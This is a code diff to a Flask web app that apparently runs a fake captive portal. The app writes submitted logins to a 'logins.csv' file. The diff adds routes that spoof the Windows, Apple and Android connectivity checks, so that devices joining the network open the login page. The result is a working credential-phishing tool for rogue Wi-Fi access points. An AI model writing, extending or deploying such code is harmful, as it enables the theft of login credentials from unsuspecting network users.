@@ -8,15 +8,25 @@ app = Flask(__name__)
 # The name of the file to save credentials to
 LOG_FILE = os.path.join(os.path.dirname(__file__), '..', 'data', 'logins.csv')
 
-@app.before_request
-def before_request():
-    """Redirect all requests to the login page, except for the login page itself and the login submission."""
-    if request.path not in ['/', '/login']:
-        return redirect(url_for('home'))
-
 @app.route('/')
 def home():
     """Serves the login page."""
+    return render_template('index.html')
+
+# Answer Windows captive-portal check
+@app.route('/connecttest.txt')
+def connecttest():
+    return "OK", 200
+
+@app.route('/ncsi.txt')
+def ncsi():
+    return "OK", 200
+
+# Answer Apple/Android captive-portal check
+@app.route('/hotspot-detect.html')
+@app.route('/success.html')
+@app.route('/generate_204')
+def portal_redirect():
     return render_template('index.html')
 
 @app.route('/login', methods=['POST'])
